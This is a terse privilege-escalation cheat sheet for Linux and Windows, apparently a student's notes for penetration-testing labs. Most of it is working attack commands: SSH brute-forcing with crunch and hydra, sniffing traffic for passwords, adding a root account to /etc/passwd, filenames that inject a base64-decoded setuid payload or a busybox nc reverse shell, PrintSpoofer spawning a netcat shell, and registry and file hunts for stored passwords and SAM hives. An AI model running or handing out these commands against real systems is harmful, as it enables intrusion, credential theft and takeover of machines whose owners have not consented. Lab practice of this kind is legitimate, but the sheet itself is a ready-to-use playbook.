# Linux

```
look for pdf files doc files and etc
pspy64
uname
sudo version and sudo
writeable permissions
suid
guid
config files
open ports
pivoting
git config
kernel exploit

ls -l /etc/shadow
id
cat /etc/passwd
hostname
cat /etc/os-release
ps aux
ip a
routel
ss -anp
cat /etc/iptables/rules.v4 | firewallshit
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
lsmod
/sbin/modinfo libata
find / -perm -u=s -type f 2>/dev/null
env
cat .bashrc
crunch 6 6 -t Lab%%% > wordlist | hydra -l eve -P wordlist  IP -t 4 ssh -V
sudo -i
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i ens192 -A | grep "pass"

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd | su root2 w00t

grep "CRON" /var/log/syslog
openssl passwd w00t | edit /etc/passwd or shadow
/usr/sbin/getcap -r / 2>/dev/null | cap_setuid+ep
cat /etc/issue
uname -r
arch

custom privesc ?
can get RCE on linux file name
touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
touch '`busybox nc IP PORT -e sh`'

source code 
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
```

# Widows

Powerup

winpeas

```
git config

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

schtasks /query /fo LIST /v


.\PrintSpoofer64.exe -c ".\nc64.exe IP port -e cmd"

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> 0x1

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

dc01\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

```
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```


```
iwr -uri http://IP/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
...
. .\PowerUp.ps1

Get-ModifiableServiceFile

for service binary LPE if you cant config or delete the binary rename it 

if you cant use sc.exe use net stop and net start or for powershell Restart-Service MSSQLSERVER -Force

use procmon on an exe to identify missing dll this is for dll hijacking


alternative way for procmon this is for CLI

.\Listdlls64.exe -accepteula -r
.\Listdlls64.exe -accepteula BetaServ.exe 
```

```
Get-LocalUser
Get-LocalGroup
systeminfo
netstat -ano
route print
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname, DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname, DisplayVersion
Get-Process | check for non standard process
gwmi win32_process | select Handle, CommandLine | format-list
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\<specific folder> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.cfg -File -Recurse -ErrorAction SilentlyContinue
Get-History
(Get-PSReadlineOption).HistorySavePath
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
Get-ChildItem -Path C:\ -Include "SAM" -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Include "SYSTEM" -File -Recurse -ErrorAction SilentlyContinue  
Get-ChildItem -Path C:\ -Include "SECURITY" -File -Recurse -ErrorAction SilentlyContinue

if can shutdown or restart to gain privesc do it

use procmon to monitor process of a custom binary (ex it tries to find some dll on a nonexisting file)

$env:path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v ""

wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v ""


sc.exe query
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:" | ForEach-Object { $_.Line.Split(":")[1].Trim() } | ForEach-Object { Write-Host "$($_)" }

======for schedule task use this pshell====

schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:|Task To Run:|Author:|Next Run Time:" | ForEach-Object { $_.Line.Trim() -replace "Next Run Time:", "`nNext Run Time:" } | ForEach-Object { Write-Host "$($_)" }

Get-ScheduledTask | ForEach-Object { $_.Actions | Where-Object { $_.Execute -ne $null } | Select-Object -ExpandProperty Execute }

Get-Childitem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}


desperate ? check event viewer
Get-EventLog -LogName System

Script Block Logging
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Select-Object -ExpandProperty Message
```